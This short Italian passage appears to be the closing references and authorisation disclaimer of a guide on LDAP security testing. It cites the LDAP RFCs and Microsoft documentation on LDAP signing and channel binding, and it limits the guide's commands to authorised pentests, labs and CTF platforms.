*Riferimenti: RFC 4511 (LDAPv3), RFC 4513 (metodi di autenticazione LDAP), RFC 4514 (DN), RFC 4515 (filtri) e la documentazione Microsoft su LDAP signing e channel binding. Verifica sempre opzioni e output sulla versione dei tool che usi. Tutti i comandi di questa guida vanno usati solo su sistemi autorizzati: pentest con contratto, lab personali, piattaforme CTF.*
